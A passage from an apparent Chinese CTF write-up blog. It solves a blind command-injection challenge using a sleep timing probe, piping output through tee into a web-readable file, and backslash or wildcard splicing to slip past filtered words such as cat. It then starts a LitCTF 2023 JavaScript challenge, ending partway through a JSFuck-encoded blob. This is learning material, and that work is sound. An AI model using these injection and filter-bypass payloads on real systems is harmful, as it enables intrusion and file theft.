data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nvc21vc2xpbi9hcnRpY2xlL2RldGFpbHMvMTIzMDM5MDY3Izp+OnRleHQ9ZXhlYyUyQ3NoZWxsX2V4ZWMlMjAlRTclQUQlODklRTUlODclQkQlRTYlOTUlQjAlRTUlOEYlQUYlRTQlQkIlQTUlRTYlODklQTclRTglQTElOEMlRTUlOTElQkQlRTQlQkIlQTQlRTQlQkQlODYlRTYlQjIlQTElRTYlOUMlODklRTUlOUIlOUUlRTYlOTglQkUlRUYlQkMlOEMlRTYlODglOTElRTQlQkIlQUMlRTklOUMlODAlRTglQTYlODElRTUlQUYlQkIlRTYlODklQkUlRTYlOTYlQjklRTYlQjMlOTUlRTYlOUQlQTUlRTUlQkUlOTclRTUlODglQjAlRTUlOTElQkQlRTQlQkIlQTQlRTYlODklQTclRTglQTElOEMlRTUlOTAlOEUlRTclOUElODQlRTclQkIlOTMlRTYlOUUlOUMlMjAlM0MlM0ZwaHAsaGlnaGxpZ2h0X19maWxlJTI4X19GSUxFX18lMjklMjBzaGVsbF9leGVjJTI4JTI0X0dFVCU1QmNtZCU1RCUyOSUzQiUyMCUzRiUzRSUyMDE=\">命令执行无回显利用</span></p>\n<p>首先我们得判断命令是否能够执行，可以使用命令：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?url=l\\s|<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span>5<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>发现页面加载了 5 秒中，说明是可以执行命令的。</p>\n<p>再看看过滤了哪些东西，很明显 bash 反弹，wget 外带等方法用不了了，</p>\n<p>不过我们可以使用 tee 命令配合管道符读取标准输入的数据，并将其内容输出成文件。</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?url=l\\s /| tee 1.txt</pre></td></tr></table></figure><p>这里除了反斜杠也可以用引号，形成拼接绕过。</p>\n<p>执行后访问 1.txt 得到：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a_here_is_a_f1ag</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>bin</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>boot</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dev</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>etc</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>flllllaaaaaaggggggg</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>home</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>lib</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>lib64</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>media</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>mnt</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>opt</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>proc</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>root</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>run</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sbin</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>srv</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sys</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>tmp</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>usr</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>var</pre></td></tr></table></figure><p>接着使用 tac 等命令代替 cat，或者用反斜杠绕过过滤即可。</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?url=ca\\t /flllll??????ggggggg| tee 2.txt</pre></td></tr></table></figure><h2 id=\"2023914\"><a class=\"anchor\" href=\"#2023914\">#</a> 2023/9/14</h2>\n<p>放松一下，做几道 js 分析题。</p>\n<h3 id=\"litctf-20231zjs\"><a class=\"anchor\" href=\"#litctf-20231zjs\">#</a> [LitCTF 2023]1zjs</h3>\n<h4 id=\"js分析信息收集\"><a class=\"anchor\" href=\"#js分析信息收集\">#</a> js 分析，信息收集</h4>\n<p>进去玩会魔方，没啥东西，开源码看看有啥东西。</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>script src<span class=\"token operator\">=</span><span class=\"token string\">\"./dist/index.umd.js\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></pre></td></tr></table></figure><p>访问。</p>\n<p>先 ctrl+f 搜搜有没有 flag，没搜到。</p>\n<p>再搜搜 php 碰碰运气，得到下面信息：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PERFORMANCE OF THIS SOFTWARE.Your gift just take <span class=\"token property\">it</span> <span class=\"token punctuation\">:</span> /f@k3f1ag.php</pre></td></tr></table></figure><p>接着访问 /f@k3f1ag.php</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token 